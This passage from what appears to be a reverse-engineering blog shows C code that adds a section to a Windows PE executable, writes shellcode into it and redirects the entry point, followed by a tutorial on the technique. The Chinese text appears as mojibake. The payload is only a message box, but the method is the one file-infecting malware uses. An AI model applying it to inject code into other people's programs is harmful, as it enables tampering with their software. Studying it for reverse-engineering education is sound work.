class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ImgaeBase  0x10000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MessageBox_Addr 0x75C93D90</span><br>BYTE Shell[] = &#123;<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x00</span>,<br>           <span class="hljs-number">0xE8</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<br>           <span class="hljs-number">0xe9</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>&#125;;<br><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            <br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Section_add</span><span class="hljs-params">(FILE* fp,<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    DWORD size =  Size(fp);<br>    DWORD new_size = size + ADD_SIZE + <span class="hljs-number">0x100</span>;<br><br>    <span class="hljs-type">char</span>* NewBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(new_size);<br>    <span class="hljs-keyword">if</span> (!NewBuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed to creat buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">memset</span>(NewBuffer,<span class="hljs-number">0</span>,new_size);<br>    <span class="hljs-built_in">memcpy</span>(NewBuffer,buffer,size);<br><br>    <span class="hljs-comment">//åˆå§‹åŒ–PEå¤´éƒ¨ä¿¡æ¯</span><br>DosHeader = (PIMAGE_DOS_HEADER)NewBuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(NewBuffer + DosHeader-&gt;e_lfanew);<br>FILEHeader = (PIMAGE_FILE_HEADER)(NewBuffer+DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚è¡¨åœ°å€</span><br>PIMAGE_SECTION_HEADER LastSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader+IMAGE_SIZEOF_SECTION_HEADER*(FILEHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>));<br><span class="hljs-comment">//æ–°èŠ‚è¡¨åœ°å€</span><br>PIMAGE_SECTION_HEADER NewSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader + IMAGE_SIZEOF_SECTION_HEADER * (FILEHeader-&gt;NumberOfSections));<br><br>    <span class="hljs-comment">//åˆ¤æ–­å‰©ä½™ç©ºé—´</span><br>    DWORD Remained_size = (DWORD)(OptionalHeader-&gt;SizeOfHeaders - DosHeader-&gt;e_lfanew - <span class="hljs-number">4</span><br>- IMAGE_SIZEOF_FILE_HEADER - IMAGE_SIZEOF_SECTION_HEADER * FILEHeader-&gt;NumberOfSections);<br><span class="hljs-keyword">if</span> (Remained_size &lt; <span class="hljs-number">2</span> * IMAGE_SIZEOF_SECTION_HEADER)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do not have enough space!\n&quot;</span>);<br><span class="hljs-built_in">free</span>(NewBuffer);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">//===================ä¿®æ”¹ä¿¡æ¯====================</span><br><span class="hljs-comment">//å…¶ä»–å¤´éƒ¨éœ€è¦ä¿®æ”¹çš„ä¿¡æ¯</span><br>FILEHeader-&gt;NumberOfSections += <span class="hljs-number">1</span>;<br>    OptionalHeader-&gt;SizeOfImage += ADD_SIZE;<br>    <br>    <span class="hljs-comment">//å¡«å…¥æ•°æ®</span><br>    <span class="hljs-built_in">memcpy</span>(NewSection-&gt;Name,<span class="hljs-string">&quot;.NewSec&quot;</span>,<span class="hljs-number">8</span>);<br>    NewSection-&gt;Misc.VirtualSize = ADD_SIZE;<br>    NewSection-&gt;SizeOfRawData = ADD_SIZE;<br>    NewSection-&gt;PointerToRawData = LastSection-&gt;PointerToRawData + LastSection-&gt;SizeOfRawData;<br><br>DWORD add_size = LastSection-&gt;Misc.VirtualSize &gt; LastSection-&gt;SizeOfRawData ? LastSection-&gt;Misc.VirtualSize : LastSection-&gt;SizeOfRawData;<br><br>    NewSection-&gt;VirtualAddress = LastSection-&gt;VirtualAddress + add_size;<br><br>    <span class="hljs-comment">//æ‰¾åˆ°å¼€å§‹çš„åœ°æ–¹</span><br>    <span class="hljs-keyword">if</span> (NewSection-&gt;VirtualAddress % OptionalHeader-&gt;SectionAlignment)<br>&#123;<br>NewSection-&gt;VirtualAddress = NewSection-&gt;VirtualAddress / OptionalHeader-&gt;SectionAlignment * OptionalHeader-&gt;SectionAlignment +OptionalHeader-&gt;SectionAlignment;<br>&#125;<br><br>NewSection-&gt;Characteristics = <span class="hljs-number">0x60000020</span>;<br>    <span class="hljs-comment">//åˆ°è¿™é‡Œå°±å·²ç»å®ŒæˆèŠ‚çš„å¢åŠ äº†</span><br><br>    <span class="hljs-comment">//æ’å…¥shellcode</span><br>    <span class="hljs-type">char</span>* shell_begin = NewBuffer + NewSection-&gt;PointerToRawData;<br><br>DWORD begin_FOA = NewSection-&gt;PointerToRawData;<br><br><br>DWORD e8_FOA = begin_FOA + <span class="hljs-number">8</span>;<br>DWORD e9_FOA = e8_FOA + <span class="hljs-number">5</span>;<br><br>DWORD begin_RVA = FOA_TO_RVA(begin_FOA,NewBuffer);<br><span class="hljs-comment">//è®¡ç®—callåœ°å€çš„ç¼–ç  å³e8 xxxxx</span><br>DWORD e8_x_addr = MessageBox_Addr - (FOA_TO_RVA(e9_FOA,NewBuffer)+ImgaeBase);<br><span class="hljs-comment">//è®¡ç®—åŸoepçš„åœ°å€ç¼–ç  å³e9 xxxxx</span><br>DWORD e9_x_addr = OptionalHeader-&gt;AddressOfEntryPoint - (FOA_TO_RVA(e9_FOA,NewBuffer)+<span class="hljs-number">5</span>);<br><br><span class="hljs-comment">//å…ˆä¿®æ”¹åŸOEP</span><br>OptionalHeader-&gt;AddressOfEntryPoint = NewSection-&gt;VirtualAddress;<br>    <span class="hljs-comment">// OptionalHeader-&gt;AddressOfEntryPoint = 0x5DEFC;</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%X&quot;</span>,FOA_TO_RVA(begin_FOA,NewBuffer));<br><br>    <span class="hljs-built_in">memcpy</span>(shell_begin,Shell,<span class="hljs-number">18</span>);<br><br><span class="hljs-comment">//è¿™é‡Œè¦æ³¨æ„memcpyçš„ç”¨æ³•</span><br>DWORD* e8 = (DWORD*)(shell_begin + <span class="hljs-number">9</span>);<br>DWORD* e9 = (DWORD*)(shell_begin + <span class="hljs-number">14</span>);<br><span class="hljs-built_in">memcpy</span>(e8,&amp;e8_x_addr,<span class="hljs-number">4</span>);<span class="hljs-comment">//è¿™é‡Œä¹Ÿå¯èƒ½æ˜¯1ï¼ŒæŠŠ4æ”¹ä¸º1</span><br><span class="hljs-built_in">memcpy</span>(e9,&amp;e9_x_addr,<span class="hljs-number">4</span>);<br><br><br>    <span class="hljs-keyword">return</span> NewBuffer;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br>    <span class="hljs-type">char</span>* new_buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info_shell.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    new_buffer = Section_add(fp1,buffer);<br>    fwrite(new_buffer,size+<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x100</span>,<span class="hljs-number">1</span>,fp2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEæ–‡ä»¶ç»“æ„ï¼ˆå››ï¼‰</title>
    <link href="/2023/07/02/PE_3/"/>
    <url>/2023/07/02/PE_3/</url>
    
    <content type="html"><![CDATA[<p>PEç»ƒä¹ ï¼Œä¿®æ”¹OEPæ‰§è¡Œshellcode</p><span id="more"></span><h2 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h2><p>åœ¨å¯é€‰PEå¤´OptionalHeaderä¸­æœ‰è¿™æ ·ä¸€ä¸ªæˆå‘˜<code>AddressOfEntryPoint</code>,è¿™ä¸ªæˆå‘˜è®°å½•æ•´ä¸ªexeç¨‹åºå¼€å§‹å…¥å£åœ°å€ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªRVAï¼Œå³è™šæ‹Ÿç›¸å¯¹åœ°å€ï¼Œéœ€è¦å°†å…¶åŠ ä¸Šç¨‹åºè£…è½½çš„åŸºå€å³ImageBaseæ‰æ˜¯åœ¨å†…å­˜ä¸­çœŸæ­£è¿è¡Œçš„åœ°å€ã€‚</p><p>é‚£ä¹ˆè‡ªç„¶å°±æœ‰ä¸€ç§æƒ³æ³•ï¼Œèƒ½å¦é€šè¿‡ä¿®æ”¹è¿™ä¸ªOEPï¼Œåœ¨ç¨‹åºæ‰§è¡Œä¹‹å‰å…ˆæ‰§è¡Œå…¶ä»–ä»£ç ï¼Œç„¶åå†æ‰§è¡Œæºä»£ç ï¼Ÿ</p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="è¦æ±‚"><a href="#è¦æ±‚" class="headerlink" title="è¦æ±‚"></a>è¦æ±‚</h3><p>1.é€šè¿‡ä¿®æ”¹OEPï¼Œåœ¨ç¨‹åºæ‰§è¡Œå‰æ‰§è¡Œä¸€ä¸ªå¼¹çª—</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021658762.png"></p><p>2.å¼¹çª—åæ¢å¤æ­£å¸¸æ‰§è¡Œæµ</p><h3 id="éœ€è¦è§£å†³çš„é—®é¢˜"><a href="#éœ€è¦è§£å†³çš„é—®é¢˜" class="headerlink" title="éœ€è¦è§£å†³çš„é—®é¢˜"></a>éœ€è¦è§£å†³çš„é—®é¢˜</h3><p>Q1ï¼šå¼¹çª—å‡½æ•°åœ¨å“ªé‡Œ</p><p>A1ï¼šå¯ä»¥å…ˆä½¿ç”¨ODç­‰è°ƒè¯•å·¥å…·è£…è½½exeæ–‡ä»¶ï¼Œåœ¨è°ƒè¯•å·¥å…·é‡Œé¢æ‰¾åˆ°å¼¹çª—å‡½æ•°MessageBoxA</p><p>å‡½æ•°åŸå‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">MessageBoxA</span><span class="hljs-params">( HWND hWnd,LPCTSTR lpText, LPCTSTR lpCaption = <span class="hljs-literal">NULL</span>, UINT nType = MB_OK )</span>;<br></code></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜</p><blockquote><p>hWndï¼šè¡¨ç¤ºçª—å£å¥æŸ„ï¼ŒæŒ‡å®šè¯¥å¯¹è¯æ¡†çš„æ‰€æœ‰è€…çª—å£ï¼›å¦‚æœè¯¥å‚æ•°ä¸ºç©º(0&#x2F;NULL)ï¼Œåˆ™è¯¥å¯¹è¯æ¡†ä¸å±äºä»»ä½•çª—å£<br>lpTextï¼šå­—ç¬¦ä¸²ï¼ŒæŒ‡æ˜¾ç¤ºåœ¨å¯¹è¯æ¡†ä¸­çš„å†…å®¹<br>lpCaptionï¼šå­—ç¬¦ä¸²ï¼ŒæŒ‡å¯¹è¯æ¡†çš„æ ‡é¢˜ï¼›å¦‚æœæ­¤å‚æ•°ä¸ºç©ºï¼Œåˆ™é»˜è®¤ä½¿ç”¨â€œé”™è¯¯â€ä½œä¸ºæ ‡é¢˜<br>nTypeï¼šæŒ‡å®šæ˜¾ç¤ºæŒ‰é’®çš„æ•°ç›®åŠå½¢å¼ï¼Œè¡¨åä½¿ç”¨çš„å›¾æ ‡æ ·å¼ã€ç¼ºçœæŒ‰é’®æ˜¯ä»€ä¹ˆã€ä»¥åŠæ¶ˆæ¯æ¡†çš„å¼ºåˆ¶å›åº”ç­‰</p></blockquote><p>Q2ï¼šå¦‚ä½•è°ƒç”¨</p><p>A2ï¼šMessageBoxAæœ‰å››ä¸ªå‚æ•°ï¼Œé€šè¿‡æ ˆæ¥ä¼ é€’å‚æ•°ï¼Œç®€å•èµ·è§ï¼Œåªéœ€è¦è¿ç»­çš„å››ä¸ª<code>push 0</code>å³å¯ï¼Œåœ¨pushå®Œåï¼Œå°±åº”è¯¥ä½¿ç”¨callæŒ‡ä»¤è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œç±»ä¼¼äº<code>call x</code>ã€‚ç„¶è€Œæ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„xå¹¶ä¸æ˜¯åœ¨è°ƒè¯•å·¥å…·é‡Œæ‰¾åˆ°MessageBoxAçš„åœ°å€ï¼Œè€Œæ˜¯æ‰¾åˆ°çš„åœ°å€å‡å»callæŒ‡ä»¤çš„ä¸‹ä¸€æ¡åœ°å€ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚callæŒ‡ä»¤åœ°å€æ˜¯0x1000ï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€æ˜¯0x1005ï¼ˆcallæŒ‡ä»¤å 5ä¸ªå­—èŠ‚é•¿åº¦ï¼‰ï¼Œéœ€è¦callçš„å‡½æ•°åœ°å€ä½ç½®ä¸º0x1105ï¼Œé‚£ä¹ˆå°±åº”è¯¥å†™ä¸º<code>call 0x100</code>ï¼Œè¿™é‡Œçš„100å°±æ˜¯0x1105 - 0x1005å¾—åˆ°ã€‚</p><p>ç”±äºæ˜¯åœ¨æ–‡ä»¶é‡Œé¢è¿›è¡Œä¿®æ”¹ï¼Œè¿™é‡Œä¿®æ”¹çš„å°±æ˜¯æœºå™¨ç ï¼Œ<code>push 0</code>çš„æœºå™¨ç æ˜¯<code>6A 00</code>ï¼Œ<code>call x</code>çš„æœºå™¨ç æ˜¯<code>e8 x</code>ï¼Œå…¶ä¸­xå å››ä¸ªå­—èŠ‚ï¼Œe8å³ä¸ºcallçš„æ“ä½œç </p><p>Q3ï¼šå¦‚ä½•è¿”å›</p><p>A3ï¼šåœ¨callå®ŒMessageBoxAåï¼Œå°±åº”è¯¥è¿”å›åŸæ¥çš„æ­£å¸¸æ‰§è¡Œæµï¼Œé‚£ä¹ˆå¯ä»¥åœ¨callæŒ‡ä»¤ä¸‹ä¸€æ¡ä½¿ç”¨jmpæŒ‡ä»¤ç›´æ¥è·³å›åŸæ¥çš„OEPï¼Œæ ¼å¼ä¸º<code>jmp x</code>ï¼ŒåŒæ ·çš„ï¼Œè¿™é‡Œçš„xä¹Ÿæ˜¯jmpä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å‡å»è¦è·³è½¬çš„æŒ‡ä»¤åœ°å€ï¼Œxä¹Ÿä¸ºå››å­—èŠ‚ï¼Œæœºå™¨ç æ ¼å¼ä¸º<code>e9 x</code>ï¼Œe9å³ä¸ºjmpçš„æ“ä½œç </p><p>Q4ï¼šåœ¨å“ªé‡Œæ’å…¥shellcode</p><p>A4ï¼šç†æƒ³çš„æ’å…¥ä½ç½®å°±æ˜¯CodeåŒºæˆ–è€…TextåŒºï¼Œå› ä¸ºè¿™ä¸¤ä¸ªåœ°æ–¹å­˜æ”¾çš„å°±æ˜¯ä»£ç ç‰‡æ®µï¼Œå®é™…ä¸Šä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ï¼ˆå¾—æ˜¯ç©ºç™½æ®µï¼Œå³ä¸èƒ½å½±å“åŸæ¥çš„ä»£ç ï¼‰ï¼Œåªè¦ç›¸åº”çš„åœ°æ–¹æ‹¥æœ‰æ‰§è¡Œæƒé™å³å¯ã€‚</p><p>æ ¹æ®Q2ï¼ŒQ3ï¼ŒQ4å¯ä»¥æ’å…¥å¯¹åº”çš„shellcodeé›å½¢</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307021731085.png"></p><p>Q5ï¼šå¦‚ä½•ä¿®æ”¹åŸæ¥çš„OEPï¼Œä½¿å…¶æ‰§è¡Œshellcode</p><p>A5ï¼šOEPå­˜å‚¨çš„æ˜¯RVAï¼Œä¹Ÿå°±æ˜¯åœ¨å†…å­˜ä¸­åç§»ï¼Œé‚£ä¹ˆå°±éœ€è¦ä»æ–‡ä»¶åç§»è®¡ç®—å†…å­˜åç§»ï¼Œä¹Ÿå°±æ˜¯æ¶‰åŠåˆ°RVAå’ŒFOAçš„äº’ç›¸è½¬åŒ–ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œçš„RVAå’ŒFOAå…¶å®åªä¼šå¯¹èŠ‚åŒºä»¥åçš„æ•°æ®æœ‰å½±å“ï¼Œæ‰€æœ‰çš„å¤´å…¶å®éƒ½æ˜¯ä¸å˜çš„ï¼Œå› ä¸ºè¿™äº›å¤´ä¹‹é—´éƒ½æ˜¯ç´§ç´§æŒ¨åœ¨ä¸€èµ·çš„ï¼Œä¸­é—´æ²¡æœ‰å¡«å……ã€‚</p><p>é‚£ä¹ˆç»™å‡ºä¸€ä¸ªFOAï¼Œå¦‚ä½•è®¡ç®—å®ƒçš„RVAå‘¢ã€‚å®é™…ä¸Šåªéœ€è¦ç¡®å®šå®ƒåœ¨å“ªä¸€ä¸ªèŠ‚åŒºï¼Œå‡å»è¿™ä¸ªèŠ‚åŒºçš„èµ·å§‹åœ°å€ï¼Œç®—å‡ºå®ƒåœ¨èŠ‚åŒºä¸­çš„åç§»offsetï¼Œå†åŠ ä¸ŠèŠ‚åŒºåœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€å³å¯ç®—å‡ºåœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚ç¡®å®šèŠ‚åŒºä¹Ÿå¥½åŠï¼Œåªéœ€è¦å¤§äºæ­¤èŠ‚åŒºå¼€å§‹åœ°å€<code>VirtualAddress</code>ï¼Œå°äºä¸‹ä¸€ä¸ªèŠ‚åŒºå¼€å§‹åœ°å€ï¼Œå°±å¯ä»¥ç¡®å®šå®ƒæ˜¯åœ¨æ­¤èŠ‚åŒºä¸­ã€‚</p><p>ä»RVAè®¡ç®—FOAä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œç¡®å®šèŠ‚åŒºï¼Œç®—èŠ‚åŒºåç§»ï¼ŒåŠ ä¸ŠèŠ‚åŒºåœ¨æ–‡ä»¶ä¸­èµ·å§‹åœ°å€<code>PointerToRawData</code>ï¼Œç»™å‡ºä»£ç å®ç°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders) <span class="hljs-comment">//å¤´éƒ¨åœ°å€ç›´æ¥è¿”å›</span><br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123; <span class="hljs-comment">//èŠ‚åŒºåˆ¤å®šæ¡ä»¶</span><br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* 